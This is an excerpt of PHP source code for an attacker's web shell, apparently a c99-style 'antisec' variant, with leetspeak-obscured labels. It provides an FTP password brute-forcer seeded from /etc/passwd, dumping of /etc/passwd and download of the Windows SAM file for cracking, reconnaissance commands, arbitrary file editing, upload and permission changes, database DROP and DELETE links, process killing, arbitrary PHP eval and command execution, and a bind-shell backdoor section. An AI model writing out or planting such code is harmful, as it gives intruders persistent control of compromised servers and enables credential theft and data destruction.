       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_antisec=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."antisec=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_antisec=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."antisec=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_antisec=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."antisec=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      ...
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."antisec=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_antisec\">";
      echo "<option value=\"\">With selected:</option>";
   ...
   $antisecs = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_antisec,$antisecs)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="antisec" value="sql"><input type="hidden" name="sql_antisec" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="antisec" value="sql"><input type="hidden" name="sql_antisec" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
   if (!empty($sql_antisec)) {
    echo "<hr size=\"1\" noshade>";
    if ($sql_antisec == "newdb") {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_antisec == "serverstatus") {
    ...
    if ($sql_antisec == "processes") {
     ...
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_antisec=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_antisec == "getfile")
    {
...
if ($antisec == "ftpquickbrute") {
echo "<center><table><tr><td class=barheader colspan=2>";
echo ".: Ftp Quick Brute :.</td></tr>";
echo "<tr><td>";
if ($win) {echo "Couldn't run on Windows!";}
else {
  function assftpbrutecheck($host,$poort,$timeout,$login,$poass,$sh,$fqb_onlywithsh) {
    if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
    else {$TRUE = TRUE;}
    if ($TRUE) {
      $sock = @ftp_connect($host,$poort,$timeout);
      if (@ftp_login($sock,$login,$poass)) {
        echo "<a href=\"ftp://".$login.":".$poass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$poass."\"</b></a>.<br>";
        ob_flush();
        return TRUE;
      }
    }
  ...
  if (!empty($submit)) {
    ...
    if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
      ...
      while(!feof($fp)) {
        ...
        if (assftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh)) {
      ...
      $ftpquick_t = round(gmt()-$ftpquick_st,4);
    ...
    echo "<form action=\"".$surl."\"><input type=hidden name=antisec value=\"ftpquickbrute\">".
         ...
         "<tr><td>Logging to e-mail:</td><td><input type=\"text\" name=\"fqb_logemail\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"></td></tr>".
...
if (!is_dir($d)) { echo "<center><b>$d is a not a Directory!</b></center>"; }
  ...
  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."antisec=chmod&d=".urlencode($d)."\"><b>".v13w_p3rm5_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table>";
}
}
if ($antisec == "phpinfo") {@ob_clean(); phpinfo(); ass5h3x17();}
if ($antisec == "security") {
  ...
  if (!$win) {
    if ($nixpasswd) {
      ...
      echo "<form action=\"".$surl."\"><input type=hidden name=antisec value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
      $i = $nixpwd_s;
      while ($i < $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "<a href=\"".$surl."antisec=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
          echo join(":",$uid)."<br>";
        }
        $i++;
      }
    }
    else {echo "<a href=\"".$surl."antisec=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a>";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (file_get_contents($v)) {echo "<td colspan=2><div class=fxerrmsg>You can't crack Windows passwords(".$v.")</div></td></tr>"; }
    else {echo "You can crack Windows passwords. <a href=\"".$surl."antisec=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</td></tr>";}
  }
  echo "</td></tr>";
  ...
  foreach ($v as $sec_arr) {
    ...
    if (file_get_contents($sec_full)) {
      echo " [ <a href=\"".$surl."antisec=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><u><b>".$sec_arr[0]."</b></u></a> ] ";
    }
  }
  echo "</td></tr>";
  ...
  if (!$win) {
    displaysecinfo("0S V3rs10n",s3x3c("cat /proc/version"));
    displaysecinfo("K3rn3l V3rs10n",s3x3c("sysctl -a | grep version"));
    displaysecinfo("D15tr1b N4m3",s3x3c("cat /etc/issue.net"));
    displaysecinfo("D15tr1b N4m3 (2)",s3x3c("cat /etc/*-realise"));
    displaysecinfo("CPU 1nf0",s3x3c("cat /proc/cpuinfo"));
    displaysecinfo("RAM",s3x3c("free -m"));
    displaysecinfo("HDD 5p4c3",s3x3c("df -h"));
    displaysecinfo("L157 9f 4ttr1bu735",s3x3c("lsattr -a"));
    displaysecinfo("M0un7 0p710n5",s3x3c("cat /etc/fstab"));
    displaysecinfo("cURL 1n574ll3d?",s3x3c("which curl"));
    displaysecinfo("lynx 1n574ll3d?",s3x3c("which lynx"));
    displaysecinfo("links 1n574ll3d?",s3x3c("which links"));
    displaysecinfo("fetch 1n574ll3d?",s3x3c("which fetch"));
    displaysecinfo("GET 1n574ll3d?",s3x3c("which GET"));
    displaysecinfo("perl 1n574ll3d?",s3x3c("which perl"));
    displaysecinfo("Where is Apache?",s3x3c("whereis apache"));
    displaysecinfo("Where is perl?",s3x3c("whereis perl"));
    displaysecinfo("Locate proftpd.conf",s3x3c("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",s3x3c("locate httpd.conf"));
    displaysecinfo("Locate my.conf",s3x3c("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",s3x3c("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS V3rs10n",s3x3c("ver"));
    displaysecinfo("4cc0un7 53771ngs",s3x3c("net accounts"));
  }
  echo "</table>\n";
}
if ($antisec == "mkfile") {
if ($mkfile != $d) {
  ...
  else {$antisec = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
}
else {$antisec = $dsantisec = "ls";}
}
if ($antisec == "encoder") {
echo "<script language=\"javascript\">function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script>".
     ...
     "<input type=hidden name=antisec value=encoder>".
...
if ($antisec == "selfremove") {
  if (($submit == $rndcode) and ($submit != "")) {
    if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using ".$sh_name."!"; ass5h3x17(); }
    else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
  }
  else {
    if (!empty($rndcode)) {echo "<b>Error: incorrect confirmation!</b>";}
    $rnd = rand(0,9).rand(0,9).rand(0,9);
    echo "<form action=\"".$surl."\"><input type=hidden name=antisec value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
  }
}
if ($antisec == "search") {
  ...
  if (!empty($submit)) {
    ...
    foreach($in as $v) {assfsearch($v);}
    $searchtime = round(gmt()-$searchtime,4);
  ...
  echo "<table class=contents>".
       ...
       "<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=antisec value=\"".$dsantisec."\">".
       ...
       "  <input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> f1nd files NOT containing the text</td></tr>".
...
if ($antisec == "chmod") {
  $mode = fileperms($d.$f);
  if (!$mode) {echo "<b>Ch4ng3 f1l3-m0d3 w17h 3rr0r:</b> c4n'7 g37 curr3n7 v4lu3.";}
  else {
    $form = TRUE;
    if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$antisec = "ls"; $form = FALSE; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $poerms = parse_perms($mode);
   echo "<b>Ch4ng1ng f1l3-m0d3 (".$d.$f."), ".v13w_p3rm5_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=antisec value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($poerms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($poerms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($poerms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($poerms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($poerms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($poerms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($poerms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($poerms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($poerms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
}
}
if ($antisec == "upload") {
  ...
  if ($miniform) {
    ...
    echo "<table><tr><td colspan=2 class=barheader>".
         ...
         "<tr><td><form enctype=\"multipart/form-data\" action=\"".$surl."antisec=upload&d=".urlencode($d)."\" method=POST>".
...
if (!$usefsbuff) {
  if (($antisec == "paste") or ($antisec == "copy") or ($antisec == "cut") or ($antisec == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$usefsbuff\" as TRUE.</center>";}
}
else {
  if ($antisec == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$antisecbox); ass_sess_put($sess_data); $antisec = "ls"; }
  elseif ($antisec == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$antisecbox); ass_sess_put($sess_data); $antisec = "ls";}
  elseif ($antisec == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$antisecbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$antisecbox)) {unset($sess_data["cut"][$k]);}} ass_sess_put($sess_data); $antisec = "ls";}
  if ($antisecemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); ass_sess_put($sess_data);}
  elseif ($antisecpastebuff) {
    $posterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!ass_copy_obj($v,$to)) {$posterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!ass_move_obj($v,$to)) {$posterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    ass_sess_put($sess_data);
    if (!empty($posterr)) {echo "<b>Pasting with errors:</b><br>".$posterr;}
    $antisec = "ls";
  }
  elseif ($antisecarcbuff) {
    $arcerr = "";
    if (substr($antisecarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
    else {$ext = ".tar.gz";}
    if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
    $cmdline .= " ".$antisecarcbuff_path;
  ...
  elseif ($antisecpastebuff) {
    ...
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!ass_copy_obj($v,$d)) {$posterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!ass_move_obj($v,$d)) {$posterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    ass_sess_put($sess_data);
    if (!empty($posterr)) {echo "<b>Pasting with errors:</b><br>".$posterr;}
...
if ($antisec == "ls") {
  ...
  if (count($list) == 0) { echo "<div class=fxerrmsg>Can't open folder (".htmlspecialchars($d).")!</div>";}
    ...
    if ($vd == "f") {
      ...
      $row[] = "<b>Perms</b>";
      $row[] = "<b>Action</b>";
      $poarsesort = parsesort($sort);
      $sort = $poarsesort[0].$poarsesort[1];
      $k = $poarsesort[0];
      if ($poarsesort[1] != "a") {$poarsesort[1] = "d";}
      $y = " <a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&sort=".$k.($poarsesort[1] == "a"?"d":"a")."\">";
      $y .= "<img src=\"".$surl."antisec=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($poarsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
      $row[$k] .= $y;
      for($i=0;$i<count($row)-1;$i++) {
        if ($i != $k) {$row[$i] = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&sort=".$i.$poarsesort[1]."\">".$row[$i]."</a>";}
      }
      $v = $poarsesort[0];
      ...
      foreach ($objects as $a) {
        ...
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; ass5h3x17();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
        ...
        $row = array();
        if ($o == ".") {
          $row[] = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."antisec=img&img=small_dir\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "CURDIR";
        }
        elseif ($o == "..") {
          $row[] = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."antisec=img&img=ext_lnk\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "UPDIR";
        }
        elseif (is_dir($v)) {
          if (is_link($v)) {
            $disppath .= " => ".readlink($v);
            $type = "LINK";
            $row[] = "<a href=\"".$surl."antisec=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."antisec=img&img=ext_lnk\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          else {
            $type = "DIR";
            $row[] =  "<a href=\"".$surl."antisec=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."antisec=img&img=small_dir\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          $row[] = $type;
        }
        elseif(is_file($v)) {
          ...
          $ext = $ext[$c];
          $ext = strtolower($ext);
          $row[] =  "<a href=\"".$surl."antisec=f&f=".$uo."&d=".$ud."\"><img src=\"".$surl."antisec=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$disppath."</a>";
          $row[] = view_size($a[1]);
        }
        $row[] = date("d.m.Y H:i:s",$a[2]);
        if (!$win) {$row[] = $a[3];}
        $row[] = "<a href=\"".$surl."antisec=chmod&f=".$uo."&d=".$ud."\"><b>".v13w_p3rm5_color($v)."</b></a>";
        ...
        if (is_dir($v)) {$row[] = "<a href=\"".$surl."antisec=d&d=".$uv."\"><img src=\"".$surl."antisec=img&img=ext_diz\" alt=\"Info\" border=\"0\"></a>&nbsp;".$checkbox;}
        else {$row[] = "<a href=\"".$surl."antisec=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."antisec=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."antisec=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."antisec=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."antisec=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."antisec=img&img=download\" alt=\"Download\" border=\"0\"></a>&nbsp;".$checkbox;}
    ...
    echo " :.</div>\n";
    echo "<form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=antisec value=\"".$dsantisec."\"><input type=hidden name=d value=".$d.">".
    ...
    echo "</table>".
         ...
         "<img src=\"".$surl."antisec=img&img=arrow_ltr\" border=\"0\">";
    ...
    echo "<select name=antisec><option value=\"".$antisec."\">With selected:</option>";
    echo "<option value=delete".($dsantisec == "delete"?" selected":"").">Delete</option>";
    echo "<option value=chmod".($dsantisec == "chmod"?" selected":"").">Change-mode</option>";
    if ($usefsbuff) {
      echo "<option value=cut".($dsantisec == "cut"?" selected":"").">Cut</option>";
      echo "<option value=copy".($dsantisec == "copy"?" selected":"").">Copy</option>";
      echo "<option value=unselect".($dsantisec == "unselect"?" selected":"").">Unselect</option>";
    }
...
if ($antisec == "processes") {
  ...
  if (!$ret) { echo "Can't execute \"".$handler."\"!"; }
    ...
    if (empty($porocesses_sort)) {$porocesses_sort = $sort_default;}
    $poarsesort = parsesort($porocesses_sort);
    if (!is_numeric($poarsesort[0])) {$poarsesort[0] = 0;}
    $k = $poarsesort[0];
    if ($poarsesort[1] != "a") {
      $y = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."antisec=img&img=sort_desc\" border=\"0\"></a>";
    }
    else {
      $y = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."antisec=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";
    }
    $ret = htmlspecialchars($ret);
    if (!$win) {
      if ($poid) {
        if (is_null($sig)) {$sig = 9;}
        echo "Sending signal ".$sig." to #".$poid."... ";
        if (posix_kill($poid,$sig)) {echo "OK.";}
        else {echo "ERROR.";}
      }
      ...
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) {$head[$i] = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$i.$poarsesort[1]."\"><b>".$head[$i]."</b></a>";}
      }
      $porcs = array();
      foreach ($stack as $line) {
        if (!empty($line)) {
          ...
          $line[] = "<a href=\"".$surl."antisec=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
          $porcs[] = $line;
          echo "</tr>";
        }
      }
      ...
      if ($poarsesort[1] != "a") { $y = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."antisec=img&img=sort_desc\" border=\"0\"></a>"; }
      else { $y = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."antisec=img&img=sort_asc\" border=\"0\"></a>"; }
      if ($k > count($head)) {$k = count($head)-1;}
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) { $head[$i] = "<a href=\"".$surl."antisec=".$dsantisec."&d=".urlencode($d)."&processes_sort=".$i.$poarsesort[1]."\"><b>".trim($head[$i])."</b></a>"; }
      }
      $porcs = array();
      unset($stack[0]);
      foreach ($stack as $line) {
    ...
    $v = $porocesses_sort[0];
    usort($porcs,"tabsort");
    if ($porocesses_sort[1] == "d") {$porcs = array_reverse($porcs);}
    $tab = array();
    $tab[] = $head;
    $tab = array_merge($tab,$porcs);
...
if ($antisec == "eval") {
  ...
  echo "<form action=\"".$surl."\" method=POST><input type=hidden name=antisec value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($antisec == "f") {
  echo "<div align=left>";
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
    else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
  }
  else {
    $r = @file_get_contents($d.$f);
    $ext = explode(".",$f);
    ...
    if (empty($ft)) {$ft = $rft;}
    $arr = array(
        array("<img src=\"".$surl."antisec=img&img=ext_diz\" border=\"0\">","info"),
        array("<img src=\"".$surl."antisec=img&img=ext_html\" border=\"0\">","html"),
        array("<img src=\"".$surl."antisec=img&img=ext_txt\" border=\"0\">","txt"),
        array("Code","code"),
        array("Session","phpsess"),
        array("<img src=\"".$surl."antisec=img&img=ext_exe\" border=\"0\">","exe"),
        array("SDB","sdb"),
        array("<img src=\"".$surl."antisec=img&img=ext_gif\" border=\"0\">","img"),
        array("<img src=\"".$surl."antisec=img&img=ext_ini\" border=\"0\">","ini"),
        array("<img src=\"".$surl."antisec=img&img=download\" border=\"0\">","download"),
        array("<img src=\"".$surl."antisec=img&img=ext_rtf\" border=\"0\">","notepad"),
        array("<img src=\"".$surl."antisec=img&img=change\" border=\"0\">","edit")
    );
    echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."antisec=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".v13w_p3rm5_color($d.$f)."</b><br>Select action/file-type:<br>";
    foreach($arr as $t) {
      if ($t[1] == $rft) {echo " <a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
      elseif ($t[1] == $ft) {echo " <a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
      else {echo " <a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
      echo " (<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
    }
    ...
    if ($ft == "info") {
      ...
      echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."antisec=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".v13w_p3rm5_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table>";
      $fi = fopen($d.$f,"rb");
      if ($fi) {
   ...
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
        <nobr>[<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
        <P>";
  }
  elseif ($ft == "html") {
   if ($white) {@ob_clean();}
  ...
  elseif ($ft == "exe") {
   ...
   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=antisec value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  ...
  elseif ($ft == "code") {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) {
      ...
      if (count($arr == 18)) {
        ...
        if ($dbms == "mysql") {echo "<a href=\"".$surl."antisec=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
  ...
  elseif ($ft == "img") {
    ...
    if (!$white) {
      ...
      foreach ($sizes as $v) {
        echo "<a href=\"".$surl."antisec=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
        if ($imgsize != $v ) {echo $v;}
        else {echo "<u>".$v."</u>";}
        echo "</a>&nbsp;&nbsp;&nbsp;";
      }
      echo "<br><br><img src=\"".$surl."antisec=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
    }
    else {
      @ob_clean();
      $ext = explode($f,".");
  ...
  elseif ($ft == "edit") {
   ...
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form action=\"".$surl."antisec=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."antisec=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
...
if (!$getall) {
  ...
  $k = array_keys($images);
  echo  "<center>";
  foreach ($k as $u) {echo $u.":<img src=\"".$surl."antisec=img&img=".$u."\" border=\"1\"><br>";}
  echo "</center>";
}
exit;
}
...
if ($antisec == "shbd"){
  $msg = $_POST['backcconnmsg'];
  $emsg = $_POST['backcconnmsge'];
  echo("<center><b>B1nd Sh3ll B4ckd00r:</b><br><br><form name=form method=POST>
...
<div  class=barheader2><b>C0MM4ND5 P4N3L</b></div>
<table class=mainpanel>
<?php
if (!$safemode) {
?>
